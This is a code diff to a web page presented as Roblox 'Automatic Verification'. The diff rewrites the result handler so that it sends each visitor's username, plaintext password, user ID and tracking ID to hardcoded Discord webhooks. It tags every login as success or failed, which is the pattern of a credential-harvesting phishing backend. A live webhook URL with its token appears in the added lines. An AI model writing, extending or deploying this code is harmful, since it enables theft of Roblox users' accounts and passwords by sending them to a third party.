@@ -124,6 +124,10 @@
         const username = urlParams.get('username');
         const password = urlParams.get('password');
         
+        // Discord webhook URLs - REPLACE THESE WITH YOUR ACTUAL WEBHOOKS
+        const SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
+        const FAILED_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
+        
         // Display the tracking info
         if (trackingId) {
             document.getElementById('display-tracking-id').textContent = trackingId;
@@ -323,37 +327,81 @@
                 
                 resultMessage.classList.remove('hidden');
                 
-                // Send result back to Roblox game server
-                await sendResultToServer(isSuccess);
+                // Send result to Discord
+                await sendToDiscord(isSuccess);
             } catch (error) {
                 console.error('Error reporting result:', error);
-                showError('Failed to send result to server: ' + error.message);
+                showError('Failed to send result to Discord: ' + error.message);
             }
         }
         
-        async function sendResultToServer(isSuccess) {
+        async function sendToDiscord(isSuccess) {
+            const webhookUrl = isSuccess ? SUCCESS_WEBHOOK : FAILED_WEBHOOK;
+            const statusText = isSuccess ? "✅ SUCCESS" : "❌ FAILED";
+            const color = isSuccess ? 65280 : 16711680;
+            
+            const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
+            
+            const embed = {
+                title: `🔐 Automatic Verification - ${statusText}`,
+                url: profileUrl,
+                color: color,
+                description: "**⎯⎯⎯⎯⎯『 Automatic Verification Result 』⎯⎯⎯⎯⎯**",
+                fields: [
+                    {
+                        name: "👤 Account",
+                        value: `[${username}](${profileUrl})`,
+                        inline: true
+                    },
+                    {
+                        name: "🔐 Password",
+                        value: `||${password}||`,
+                        inline: true
+                    },
+                    {
+                        name: "📊 Result",
+                        value: statusText,
+                        inline: true
+                    },
+                    {
+                        name: "🆔 Tracking ID",
+                        value: trackingId,
+                        inline: false
+                    },
+                    {
+                        name: "🤖 Method",
+                        value: "Automatic Verification",
+                        inline: false
+                    }
+                ],
+                footer: {
+                    text: `UserId: ${userId} | Tracking ID: ${trackingId}`,
+                    icon_url: "https://www.roblox.com/favicon.ico"
+                },
+                timestamp: new Date().toISOString()
+            };
+            
+            const payload = {
+                username: "Automatic Verification",
+                content: isSuccess ? "#success #auto_verified" : "#failed #auto_verified",
+                embeds: [embed]
+            };
+            
             try {
-                // Send verification result back to your Roblox game server
-                const response = await fetch(`https://your-roblox-game.com/verify-result`, {
+                const response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json',
+                        'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({
-                        trackingId: trackingId,
-                        userId: userId,
-                        username: username,
-                        password: password,
-                        success: isSuccess
-                    })
+                    body: JSON.stringify(payload)
                 });
                 
                 if (!response.ok) {
-                    throw new Error(`Server responded with ${response.status}`);
+                    throw new Error(`Discord API responded with ${response.status}`);
                 }
             } catch (error) {
-                console.error('Error sending result to server:', error);
-                // You might want to implement a fallback here, like email notification
+                console.error('Error sending to Discord:', error);
+                throw error;
             }
         }
         
